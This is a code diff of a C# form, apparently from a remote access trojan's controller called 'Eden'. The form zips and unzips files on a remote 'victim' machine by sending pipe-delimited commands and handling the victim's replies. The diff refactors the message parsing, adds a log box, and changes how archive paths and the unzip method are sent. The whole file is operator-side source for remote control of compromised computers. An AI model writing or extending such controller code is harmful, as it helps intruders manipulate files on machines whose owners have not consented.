@@ -12,14 +12,16 @@ namespace Eden
 {
     public partial class frmFileArchive : Form
     {
-        private clsVictim m_victim { get; set; }
-        private List<frmFileMgr.stEntryTag> m_lstEntry { get; set; }
-        private bool m_bCompress { get; set; }
+        private frmFileMgr m_frmMgr { get; init; }
+        private clsVictim m_victim { get; init; }
+        private List<frmFileMgr.stEntryTag> m_lstEntry { get; init; }
+        private bool m_bCompress { get; init; }
 
-        public frmFileArchive(clsVictim victim, List<frmFileMgr.stEntryTag> lstEntry, bool bCompress)
+        public frmFileArchive(frmFileMgr frmMgr, clsVictim victim, List<frmFileMgr.stEntryTag> lstEntry, bool bCompress)
         {
             InitializeComponent();
 
+            m_frmMgr = frmMgr;
             m_victim = victim;
             m_lstEntry = lstEntry;
             m_bCompress = bCompress;
@@ -29,96 +31,84 @@ namespace Eden
 
         private enum enUnzipMethod
         {
-            IndividualFolder, //Extract all file into
-            CurrentFolder, //Extract all entries into current folder.
+            Separate, //Extract all file into
+            Current, //Extract all entries into current folder.
         }
 
         private frmFileMgr.stEntryTag fnGetItemTag(ListViewItem item) => (frmFileMgr.stEntryTag)item.Tag;
 
-        private void fnRecv(clsClient clnt, string szVictimID, List<string> asMsg)
+        private void fnRecv(clsClient clnt, string szVictimID, List<string> lsMsg)
         {
-            try
+            if (!string.Equals(szVictimID, m_victim.m_szID))
+                return;
+
+            if (lsMsg[0] == "file" && lsMsg[1] == "archive")
             {
-                if (!string.Equals(szVictimID, m_victim.m_szID))
-                    return;
-
-                if (asMsg[0] == "file" && asMsg[1] == "archive")
+                if (lsMsg[2] == "zip")
                 {
-                    if (asMsg[2] == "zip")
+                    int nCode = int.Parse(lsMsg[3]);
+                    string szFilePath = lsMsg[4];
+
+                    fnLogs(nCode == 0 ? $"Failed[{szFilePath}] => " + lsMsg[5] : $"Successed[{szFilePath}]");
+                    Invoke(() => m_frmMgr.LvRefresh());
+                }
+                else if (lsMsg[2] == "unzip")
+                {
+                    var ls2d = clsTools.EZData.String2TwoDList(lsMsg[3]);
+                    foreach (var ls in ls2d)
                     {
-                        int nCode = int.Parse(asMsg[3]);
-                        if (nCode == 1)
+                        int nCode = int.Parse(ls[0]);
+                        string szFilePath = ls[1];
+
+                        Invoke(() =>
                         {
-                            string[] asEntry = asMsg[4].Split(',').Select(x => EZCrypto.Encoder.b64d2str(x)).ToArray();
-                            string szArchiveFilePath = asMsg[5];
-
-                            foreach (string szName in asEntry)
+                            List<ListViewItem> items = listView2.Items.Cast<ListViewItem>().ToList().Where(x => string.Equals(fnGetItemTag(x).szFullName, szFilePath)).ToList();
+                            if (items.Count == 0)
                             {
-                                Invoke(new Action(() =>
-                                {
-                                    ListViewItem item = listView1.FindItemWithText(Path.GetFileName(szName));
-                                    if (item == null)
-                                        return;
-
-                                    item.SubItems[1].Text = "OK";
-                                }));
+                                fnLogs("Unknown archive file: " + szFilePath);
+                                return;
                             }
 
-                            MessageBox.Show("Action successfully, archive path: " + szArchiveFilePath, "OK", MessageBoxButtons.OK, MessageBoxIcon.Information);
-                        }
-                        else
-                        {
-                            MessageBox.Show(asMsg[4], "ArchiveCompress", MessageBoxButtons.OK, MessageBoxIcon.Error);
-                        }
+                            ListViewItem item = items.First();
+                            item.SubItems[1].Text = nCode == 0 ? "Failed" : "OK";
+                            fnLogs(nCode == 0 ? "Failed => " + szFilePath : "Successed => " + szFilePath);
+                        });
                     }
-                    else if (asMsg[2] == "unzip")
-                    {
-                        int nCode = int.Parse(asMsg[3]);
-                        if (nCode == 1)
-                        {
-                            string[] asArchiveFilePath = asMsg[4].Split(',').Select(x => EZCrypto.Encoder.b64d2str(x)).ToArray();
 
-                            foreach (string szName in asArchiveFilePath)
-                            {
-                                Invoke(new Action(() =>
-                                {
-                                    ListViewItem item = listView2.FindItemWithText(Path.GetFileName(szName));
-                                    if (item == null)
-                                        return;
-
-                                    item.SubItems[1].Text = "OK";
-                                }));
-                            }
-
-                            MessageBox.Show("Action successfully.", "OK", MessageBoxButtons.OK, MessageBoxIcon.Information);
-                        }
-                        else
-                        {
-                            MessageBox.Show(asMsg[4], "ArchiveDecompress", MessageBoxButtons.OK, MessageBoxIcon.Error);
-                        }
-                    }
+                    Invoke(() => m_frmMgr.LvRefresh());
                 }
             }
-            catch (Exception ex)
+        }
+
+        private void fnLogs(string szMsg)
+        {
+            Invoke(() =>
             {
-                MessageBox.Show(ex.Message, "FileArchive", MessageBoxButtons.OK, MessageBoxIcon.Error);
-            }
+                richTextBox1.AppendText($"[{DateTime.Now.ToString("F")}]: {szMsg}");
+                richTextBox1.AppendText(Environment.NewLine);
+            });
         }
 
         private void fnSetup()
         {
+            m_victim.m_clnt.ServerMessageReceived += fnRecv;
+
             tabControl1.SelectedIndex = m_bCompress ? 0 : 1;
 
             foreach (var entry in m_lstEntry)
             {
                 ListViewItem item = new ListViewItem(Path.GetFileName(entry.szFullName));
-                item.SubItems.Add("?");
                 item.Tag = entry;
 
                 if (m_bCompress)
+                {
                     listView1.Items.Add(item);
+                }
                 else
+                {
+                    item.SubItems.Add("?");
                     listView2.Items.Add(item);
+                }
             }
 
             textBox1.Text = clsTools.GetFileNameFromDatetime("zip");
@@ -127,8 +117,10 @@ namespace Eden
                 comboBox1.Items.Add(szMethod);
 
             comboBox1.SelectedIndex = 0;
+            comboBox1.DropDownStyle = ComboBoxStyle.DropDownList;
 
-            m_victim.m_clnt.ServerMessageReceived += fnRecv;
+            toolStripStatusLabel1.Text = $"Entry[{listView1.Items.Count}]";
+            toolStripStatusLabel2.Text = $"File[{listView2.Items.Count}]";
         }
 
         private void frmFileArchive_Load(object sender, EventArgs e)
@@ -142,18 +134,23 @@ namespace Eden
             if (lEntry.Count == 0)
                 return;
 
+            string szArchiveName = textBox1.Text;
+
             Task.Run(() =>
             {
                 List<string> lsFolder = lEntry.Where(x => x.bDirectory).Select(x => x.szFullName).ToList();
                 List<string> lsFile = lEntry.Where(x => !x.bDirectory).Select(x => x.szFullName).ToList();
+
+                szArchiveName = Path.Combine(m_frmMgr.fnGetCurrentDir(), szArchiveName).Replace("\\", "/");
 
                 m_victim.fnSendCommand(string.Join("|", new string[]
                 {
                     "File",
                     "archive",
                     "zip",
-                    string.Join(",", lsFolder.Select(x => EZCrypto.Encoder.stre2b64(x))),
-                    string.Join(",", lsFile.Select(x => EZCrypto.Encoder.stre2b64(x))),
+                    szArchiveName,
+                    clsTools.EZData.OneDList2String(lsFolder),
+                    clsTools.EZData.OneDList2String(lsFile),
                 }));
             });
         }
@@ -169,16 +166,16 @@ namespace Eden
             if (lEntry.Count == 0)
                 return;
 
-            int nIdx = comboBox1.SelectedIndex;
+            string szMethod = comboBox1.Text;
 
-            Task.Run(() =>
+            _ = Task.Run(() =>
             {
                 m_victim.fnSendCommand(string.Join("|", new string[]
                 {
                     "File",
                     "archive",
                     "unzip",
-                    nIdx.ToString(),
+                    szMethod,
                     string.Join(",", lEntry.Select(x => EZCrypto.Encoder.stre2b64(x.szFullName))),
                 }));
             });
